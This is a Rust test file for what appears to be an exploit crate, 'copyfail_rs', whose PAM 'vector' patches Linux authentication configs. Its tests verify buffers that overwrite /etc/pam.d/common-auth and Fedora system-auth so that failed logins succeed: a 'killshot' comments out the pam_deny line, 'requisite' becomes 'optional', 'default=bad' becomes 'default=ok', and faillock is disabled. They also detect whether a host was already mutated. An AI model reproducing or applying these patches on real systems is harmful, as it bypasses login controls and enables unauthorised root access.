// TDD: tests written before pam.rs. Verifies pure helpers used by PamVector.

use copyfail_rs::vectors::pam::{
    build_a1_buf, build_fedora_default_flip_buf, build_fedora_faillock_comment_buf,
    build_killshot_buf, find_fedora_default_bad_offset, find_fedora_faillock_authfail_line_offset,
    find_pam_deny_killshot_offset, find_pam_deny_line_offset, parse_distro_family, DistroFamily,
    PamError,
};

// ----- Distro detection -----

#[test]
fn distro_detection_debian() {
    let body = b"PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"12\"\nID=debian\nHOME_URL=\"https://www.debian.org/\"\n";
    assert_eq!(parse_distro_family(body), DistroFamily::DebianUbuntu);
}

#[test]
fn distro_detection_ubuntu() {
    let body = b"PRETTY_NAME=\"Ubuntu 24.04.1 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nID=ubuntu\nID_LIKE=debian\n";
    assert_eq!(parse_distro_family(body), DistroFamily::DebianUbuntu);
}

#[test]
fn distro_detection_id_like_debian() {
    let body = b"NAME=\"Linux Mint\"\nID=linuxmint\nID_LIKE=\"ubuntu debian\"\n";
    assert_eq!(parse_distro_family(body), DistroFamily::DebianUbuntu);
}

#[test]
fn distro_detection_fedora() {
    let body = b"NAME=\"Fedora Linux\"\nID=fedora\nVERSION_ID=39\nID_LIKE=\"\"\n";
    assert_eq!(parse_distro_family(body), DistroFamily::FedoraRhel);
}

#[test]
fn distro_detection_rhel() {
    let body =
        b"NAME=\"Red Hat Enterprise Linux\"\nID=\"rhel\"\nID_LIKE=\"fedora\"\nVERSION_ID=\"9.3\"\n";
    assert_eq!(parse_distro_family(body), DistroFamily::FedoraRhel);
}

#[test]
fn distro_detection_arch() {
    let body = b"NAME=\"Arch Linux\"\nID=arch\nBUILD_ID=rolling\n";
    assert_eq!(parse_distro_family(body), DistroFamily::Arch);
}

#[test]
fn distro_detection_alpine_unsupported() {
    let body = b"NAME=\"Alpine Linux\"\nID=alpine\nVERSION_ID=3.19.0\n";
    assert_eq!(parse_distro_family(body), DistroFamily::Unsupported);
}

#[test]
fn distro_detection_unknown() {
    let body = b"NAME=Mystery\nID=mystery\n";
    assert_eq!(parse_distro_family(body), DistroFamily::Unsupported);
}

#[test]
fn distro_detection_empty() {
    assert_eq!(parse_distro_family(b""), DistroFamily::Unsupported);
}

// ----- Debian/Ubuntu line scan -----

const COMMON_AUTH_UBUNTU_24_04: &[u8] = b"#\n\
# /etc/pam.d/common-auth - authentication settings common to all services\n\
#\n\
# here are the per-package modules (the \"Primary\" block)\n\
auth\t[success=1 default=ignore]\tpam_unix.so nullok\n\
# here's the fallback if no module succeeds\n\
auth\trequisite\t\t\tpam_deny.so\n\
# prime the stack with a positive return value if there isn't one already;\n\
auth\trequired\t\t\tpam_permit.so\n\
# and here are more per-package modules (the \"Additional\" block)\n\
auth\toptional\t\t\tpam_cap.so \n\
# end of pam-auth-update config\n";

#[test]
fn find_pam_deny_line_in_common_auth() {
    let offset = find_pam_deny_line_offset(COMMON_AUTH_UBUNTU_24_04).expect("must find line");
    // Verify offset points to 'a' of 'auth' on the pam_deny line.
    assert_eq!(&COMMON_AUTH_UBUNTU_24_04[offset..offset + 4], b"auth");
    // And the line contains 'requisite' and 'pam_deny.so'.
    let line_end = COMMON_AUTH_UBUNTU_24_04[offset..]
        .iter()
        .position(|&b| b == b'\n')
        .map(|p| offset + p)
        .unwrap_or(COMMON_AUTH_UBUNTU_24_04.len());
    let line = &COMMON_AUTH_UBUNTU_24_04[offset..line_end];
    assert!(line.windows(9).any(|w| w == b"requisite"));
    assert!(line.windows(11).any(|w| w == b"pam_deny.so"));
}

#[test]
fn find_pam_deny_skips_commented_line() {
    let body = b"#auth\trequisite\tpam_deny.so\nauth\trequisite\tpam_deny.so\n";
    let offset = find_pam_deny_line_offset(body).expect("must find uncommented line");
    assert_eq!(&body[offset..offset + 4], b"auth");
    assert!(offset > 10); // past the commented one
}

#[test]
fn find_pam_deny_returns_none_if_absent() {
    let body = b"auth\trequired\tpam_permit.so\n";
    assert!(find_pam_deny_line_offset(body).is_none());
}

// ----- Buffer patching: killshot -----

#[test]
fn killshot_buf_replaces_auth_with_hash_aut() {
    let original = COMMON_AUTH_UBUNTU_24_04;
    let line_off = find_pam_deny_line_offset(original).unwrap();

    let mut out = [0u8; 4096];
    let n = build_killshot_buf(original, line_off, &mut out).expect("build ok");

    // Length must be multiple of 4 and cover at least line_off+4.
    assert!(n >= line_off + 4);
    assert_eq!(n % 4, 0);
    assert!(n <= 4096);

    // Bytes 0..line_off match original.
    assert_eq!(&out[..line_off], &original[..line_off]);
    // Bytes line_off..line_off+4 = b"#aut".
    assert_eq!(&out[line_off..line_off + 4], b"#aut");
    // Tail bytes (line_off+4..n) match original.
    assert_eq!(&out[line_off + 4..n], &original[line_off + 4..n]);
}

#[test]
fn killshot_buf_rejects_offset_beyond_original() {
    let original = b"short\n";
    let mut out = [0u8; 4096];
    assert!(matches!(
        build_killshot_buf(original, 100, &mut out),
        Err(PamError::OffsetOutOfBounds)
    ));
}

#[test]
fn killshot_buf_rejects_too_small_out() {
    let original = COMMON_AUTH_UBUNTU_24_04;
    let line_off = find_pam_deny_line_offset(original).unwrap();
    let mut out = [0u8; 16];
    assert!(matches!(
        build_killshot_buf(original, line_off, &mut out),
        Err(PamError::OutputTooSmall)
    ));
}

// ----- Buffer patching: A1 (replace 'requisite' with 'optional ') -----

#[test]
fn a1_buf_replaces_requisite_with_optional_space() {
    let original = COMMON_AUTH_UBUNTU_24_04;
    let line_off = find_pam_deny_line_offset(original).unwrap();

    // Find 'requisite' position in line for verification.
    let req_off = original[line_off..]
        .windows(9)
        .position(|w| w == b"requisite")
        .map(|p| line_off + p)
        .expect("requisite in line");

    let mut out = [0u8; 4096];
    let n = build_a1_buf(original, line_off, &mut out).expect("build ok");

    assert_eq!(n % 4, 0);
    assert!(n >= req_off + 9);

    // Bytes 0..req_off match original.
    assert_eq!(&out[..req_off], &original[..req_off]);
    // The 9 bytes at req_off should be 'optional ' (8 chars + space).
    assert_eq!(&out[req_off..req_off + 9], b"optional ");
    // Tail beyond req_off+9 matches original up to n.
    assert_eq!(&out[req_off + 9..n], &original[req_off + 9..n]);
}

// ----- Fedora system-auth scan + flip -----

const SYSTEM_AUTH_FEDORA_LOCAL: &[u8] = b"#%PAM-1.0\n\
# Generated by authselect\n\
auth        required                                     pam_env.so\n\
auth        required                                     pam_faildelay.so delay=2000000\n\
auth        required                                     pam_faillock.so preauth silent\n\
auth        [success=1 default=bad]                      pam_unix.so try_first_pass nullok\n\
auth        [default=die]                                pam_faillock.so authfail\n\
auth        optional                                     pam_permit.so\n\
auth        required                                     pam_faillock.so authsucc\n";

#[test]
fn find_default_bad_in_system_auth() {
    let off = find_fedora_default_bad_offset(SYSTEM_AUTH_FEDORA_LOCAL).expect("must find");
    assert_eq!(&SYSTEM_AUTH_FEDORA_LOCAL[off..off + 11], b"default=bad");
    // It must be on a line that also references pam_unix.so.
    let line_start = SYSTEM_AUTH_FEDORA_LOCAL[..off]
        .iter()
        .rposition(|&b| b == b'\n')
        .map(|p| p + 1)
        .unwrap_or(0);
    let line_end = SYSTEM_AUTH_FEDORA_LOCAL[off..]
        .iter()
        .position(|&b| b == b'\n')
        .map(|p| off + p)
        .unwrap_or(SYSTEM_AUTH_FEDORA_LOCAL.len());
    let line = &SYSTEM_AUTH_FEDORA_LOCAL[line_start..line_end];
    assert!(line.windows(11).any(|w| w == b"pam_unix.so"));
}

#[test]
fn find_faillock_authfail_line_offset() {
    let off =
        find_fedora_faillock_authfail_line_offset(SYSTEM_AUTH_FEDORA_LOCAL).expect("must find");
    // Offset must be at start of a line whose tokens include pam_faillock.so + authfail.
    assert_eq!(SYSTEM_AUTH_FEDORA_LOCAL[off], b'a'); // start of 'auth'
    let line_end = SYSTEM_AUTH_FEDORA_LOCAL[off..]
        .iter()
        .position(|&b| b == b'\n')
        .map(|p| off + p)
        .unwrap_or(SYSTEM_AUTH_FEDORA_LOCAL.len());
    let line = &SYSTEM_AUTH_FEDORA_LOCAL[off..line_end];
    assert!(line.windows(15).any(|w| w == b"pam_faillock.so"));
    assert!(line.windows(8).any(|w| w == b"authfail"));
    assert!(line.windows(12).any(|w| w == b"[default=die"));
}

#[test]
fn fedora_default_flip_buf_replaces_bad_with_ok_padded() {
    let original = SYSTEM_AUTH_FEDORA_LOCAL;
    let off = find_fedora_default_bad_offset(original).unwrap();
    let mut out = [0u8; 4096];
    let n = build_fedora_default_flip_buf(original, off, &mut out).unwrap();
    assert_eq!(n % 4, 0);
    assert!(n >= off + 11);
    // Bytes preceding the mutation are unchanged.
    assert_eq!(&out[..off], &original[..off]);
    // 'default=bad' becomes 'default=ok ' (11 bytes preserved).
    assert_eq!(&out[off..off + 11], b"default=ok ");
    assert_eq!(&out[off + 11..n], &original[off + 11..n]);
}

#[test]
fn fedora_faillock_comment_buf_writes_hash_at_line_start() {
    let original = SYSTEM_AUTH_FEDORA_LOCAL;
    let off = find_fedora_faillock_authfail_line_offset(original).unwrap();
    let mut out = [0u8; 4096];
    let n = build_fedora_faillock_comment_buf(original, off, &mut out).unwrap();
    assert_eq!(n % 4, 0);
    assert!(n > off);
    // Byte at line-start becomes '#'; bytes before mutation match original.
    assert_eq!(&out[..off], &original[..off]);
    assert_eq!(out[off], b'#');
    // Tail (off+1..n) matches original.
    assert_eq!(&out[off + 1..n], &original[off + 1..n]);
}

// ----- Regression: whitespace-prefixed Fedora lines must produce correct absolute offsets -----

const SYSTEM_AUTH_INDENTED: &[u8] = b"#%PAM-1.0\n\
\tauth        required                    pam_env.so\n\
\tauth        [success=1 default=bad]     pam_unix.so try_first_pass nullok\n\
\tauth        [default=die]               pam_faillock.so authfail\n\
\tauth        optional                    pam_permit.so\n";

#[test]
fn fedora_default_bad_offset_correct_with_leading_whitespace() {
    let off = find_fedora_default_bad_offset(SYSTEM_AUTH_INDENTED).expect("must find");
    // The returned offset MUST point exactly at the 'd' of 'default=bad'.
    assert_eq!(
        &SYSTEM_AUTH_INDENTED[off..off + 11],
        b"default=bad",
        "off={} but content slice is {:?}",
        off,
        core::str::from_utf8(&SYSTEM_AUTH_INDENTED[off..off + 11]).unwrap_or("?")
    );
}

#[test]
fn fedora_faillock_offset_points_to_auth_with_leading_whitespace() {
    let off = find_fedora_faillock_authfail_line_offset(SYSTEM_AUTH_INDENTED).expect("must find");
    // Must point to 'a' of 'auth' (mutation site for '#' comment-out), NOT line start.
    assert_eq!(SYSTEM_AUTH_INDENTED[off], b'a');
    assert_eq!(&SYSTEM_AUTH_INDENTED[off..off + 4], b"auth");
}

#[test]
fn a1_buf_returns_not_found_when_requisite_absent() {
    let body = b"auth\trequired\tpam_permit.so\n";
    // Closure pretends line_offset points to start of `auth`; inside the line
    // there is no 'requisite' token.
    let mut out = [0u8; 4096];
    let r = build_a1_buf(body, 0, &mut out);
    assert!(matches!(r, Err(PamError::NotFound)), "got {:?}", r);
}

// ----- Idempotency: detect already-mutated cache state (FIX 2) -----

const COMMON_AUTH_AFTER_KILLSHOT: &[u8] = b"#\n\
# /etc/pam.d/common-auth - authentication settings common to all services\n\
#\n\
# here are the per-package modules (the \"Primary\" block)\n\
auth\t[success=1 default=ignore]\tpam_unix.so nullok\n\
# here's the fallback if no module succeeds\n\
#aut\trequisite\t\t\tpam_deny.so\n\
# prime the stack with a positive return value if there isn't one already;\n\
auth\trequired\t\t\tpam_permit.so\n";

#[test]
fn detects_killshot_already_applied() {
    let off = find_pam_deny_killshot_offset(COMMON_AUTH_AFTER_KILLSHOT)
        .expect("must detect prior killshot");
    // Offset points at the '#' that replaced 'a' of 'auth'.
    assert_eq!(COMMON_AUTH_AFTER_KILLSHOT[off], b'#');
    assert_eq!(&COMMON_AUTH_AFTER_KILLSHOT[off..off + 4], b"#aut");
}

#[test]
fn returns_none_on_clean_common_auth() {
    assert!(find_pam_deny_killshot_offset(COMMON_AUTH_UBUNTU_24_04).is_none());
}

#[test]
fn ignores_unrelated_commented_lines() {
    let body = b"#auth\trequired\tpam_permit.so\n#aut foobar\n# random comment\nauth\trequired\tpam_permit.so\n";
    assert!(find_pam_deny_killshot_offset(body).is_none());
}

#[test]
fn detects_killshot_with_leading_whitespace() {
    let body = b"\t#aut\trequisite\t\t\tpam_deny.so\n";
    let off = find_pam_deny_killshot_offset(body).expect("must detect indented");
    assert_eq!(body[off], b'#');
}

#[test]
fn killshot_detection_rejects_space_after_hash_aut() {
    // Reviewer M1: the original killshot writes #aut over auth, and the byte
    // after `auth` in /etc/pam.d/common-auth is always TAB. A handcrafted
    // comment using space `#aut requisite ... pam_deny.so` must NOT match.
    let body = b"#aut requisite pam_deny.so\n";
    assert!(find_pam_deny_killshot_offset(body).is_none());
}

// ----- Live-environment sanity (non-fatal, ignored unless run on dev box) -----

#[test]
#[ignore]
fn pam_permit_present_on_dev_box() {
    use std::path::Path;
    let candidates = [
        "/lib/x86_64-linux-gnu/security/pam_permit.so",
        "/usr/lib64/security/pam_permit.so",
        "/usr/lib/security/pam_permit.so",
    ];
    let any = candidates.iter().any(|p| Path::new(p).exists());
    assert!(any, "pam_permit.so not found at any expected path");
}
